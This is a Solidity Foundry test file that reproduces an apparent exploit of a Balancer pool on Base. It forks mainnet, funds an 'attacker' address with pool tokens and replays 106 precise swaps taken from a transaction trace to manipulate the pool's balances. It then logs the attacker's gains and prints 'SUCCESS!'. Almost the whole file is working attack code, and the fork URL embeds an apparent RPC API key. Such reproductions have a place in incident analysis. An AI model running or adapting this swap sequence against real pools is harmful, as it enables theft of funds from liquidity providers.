// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IBalancerVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct SingleSwap {
        bytes32 poolId;
        SwapKind kind;
        IAsset assetIn;
        IAsset assetOut;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function swap(
        SingleSwap memory singleSwap,
        FundManagement memory funds,
        uint256 limit,
        uint256 deadline
    ) external payable returns (uint256);

    function getPoolTokens(bytes32 poolId)
        external view
        returns (
            IERC20[] memory tokens,
            uint256[] memory balances,
            uint256 lastChangeBlock
        );

    function manageUserBalance(UserBalanceOp[] memory ops) external payable;

    function getInternalBalance(address user, IERC20[] memory tokens)
        external view
        returns (uint256[] memory balances);
}

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function symbol() external view returns (string memory);
}

contract BalancerBasePoolTest is Test {
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    bytes32 constant POOL_ID_BASE = 0xc771c1a5905420daec317b154eb13e4198ba97d0000000000000000000000023;
    address constant BASE_POOL_BPT = 0xC771c1a5905420DAEc317b154EB13e4198BA97D0;
    address constant BASE_WETH = 0x4200000000000000000000000000000000000006;  // Index 0
    address constant BASE_rETH = 0xB6fe221Fe9EeF5aBa221c348bA20A1Bf5e73624c;   // Index 1
    address constant BASE_ATTACKER = 0x56e5Adab68b594B0c2aD6C112D94AE5aCA98A001;

    struct ExactSwapData {
        address tokenIn;
        address tokenOut;
        uint256 amount;
        uint256 expectedIn;
        uint8 indexIn;
        uint8 indexOut;
    }

    function testBasePool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.base-mainnet.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            37683327
        );

        (, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_BASE);

        console.log("INITIAL STATE:");
        console.log("WETH (index 0):", initialBalances[0] / 1e18, "ETH");
        console.log("rETH (index 1):", initialBalances[1] / 1e18, "ETH");
        console.log("BPT (index 2):", initialBalances[2]);

        // Fund attacker with BPT directly for exact swaps
        deal(BASE_POOL_BPT, BASE_ATTACKER, 10000 ether);

        vm.startPrank(BASE_ATTACKER);
        IERC20(BASE_POOL_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(BASE_WETH).approve(address(VAULT), type(uint256).max);
        IERC20(BASE_rETH).approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: BASE_ATTACKER,
            fromInternalBalance: true,
            recipient: payable(BASE_ATTACKER),
            toInternalBalance: true
        });

        // 106 exact swaps from transaction trace
        ExactSwapData[106] memory swaps;
        swaps[0] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 16941129211957497338, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[1] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 23786060032823179715, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[2] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 169411292119574974, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[3] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 237860600328231798, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[4] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 1694112921195750, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[5] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 2378606003282318, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[6] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 16941129211957, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[7] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 23786060032823, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[8] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 169411292120, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[9] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 237860600328, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[10] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 1694112921, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[11] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 2378606003, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[12] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 16941129, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[13] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 23786060, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[14] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 169411, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[15] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 237861, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[16] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 1694, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[17] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 2378, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[18] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_WETH, amount: 18, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[19] = ExactSwapData({ tokenIn: BASE_POOL_BPT, tokenOut: BASE_rETH, amount: 25, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[20] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 39993, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[21] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[22] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 288000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[23] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 28289, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[24] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[25] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 225000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[26] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 27869, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[27] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[28] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 171000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[29] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 23158, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[30] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[31] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 126000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[32] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 14946, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[33] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[34] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 99000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[35] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 13949, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[36] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[37] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 81000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[38] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 16015, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[39] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[40] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 63900, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[41] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 14000, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[42] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[43] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 50400, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[44] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 12203, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[45] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[46] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 40500, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[47] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 10397, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[48] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[49] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 32400, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[50] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 9362, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[51] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[52] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 24300, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[53] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6079, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[54] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[55] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 21600, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[56] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6961, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[57] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[58] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 18000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[59] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6224, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[60] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[61] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 13770, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[62] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 4274, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[63] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[64] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 12150, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[65] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 4153, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[66] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[67] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 10800, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[68] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 4058, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[69] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[70] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 8910, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[71] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 3291, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[72] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[73] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 8100, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[74] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 3199, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[75] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[76] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 6966, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[77] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2883, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[78] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[79] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 6075, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[80] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2649, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[81] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[82] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 5670, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[83] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2541, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[84] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[85] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 5265, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[86] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2408, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[87] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[88] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 5103, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[89] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2366, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[90] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[91] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 4941, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[92] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2278, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[93] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[94] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 4455, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[95] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2120, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[96] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[97] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 4212, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[98] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2034, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[99] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[100] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 4131, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[101] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 2024, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[102] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[103] = ExactSwapData({ tokenIn: BASE_rETH, tokenOut: BASE_WETH, amount: 4050, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[104] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 1990, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[105] = ExactSwapData({ tokenIn: BASE_WETH, tokenOut: BASE_rETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 1 });

        console.log("Total swaps:", swaps.length);

        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_BASE,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) returns (uint256) {
                successCount++;
            } catch {
                // Continue on failure
            }
        }

        console.log("Swaps executed:", successCount);

        vm.stopPrank();

        (, uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_BASE);

        console.log("FINAL STATE:");
        console.log("WETH (index 0):", finalBalances[0] / 1e18, "ETH");
        console.log("rETH (index 1):", finalBalances[1] / 1e18, "ETH");
        console.log("BPT (index 2):", finalBalances[2]);

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(BASE_POOL_BPT).balanceOf(BASE_ATTACKER) / 1e18, "ETH");
        console.log("WETH:", IERC20(BASE_WETH).balanceOf(BASE_ATTACKER) / 1e18, "ETH");
        console.log("rETH:", IERC20(BASE_rETH).balanceOf(BASE_ATTACKER) / 1e18, "ETH");
        
        console.log("Total swaps executed:", successCount);
        console.log("SUCCESS!");
    }
}
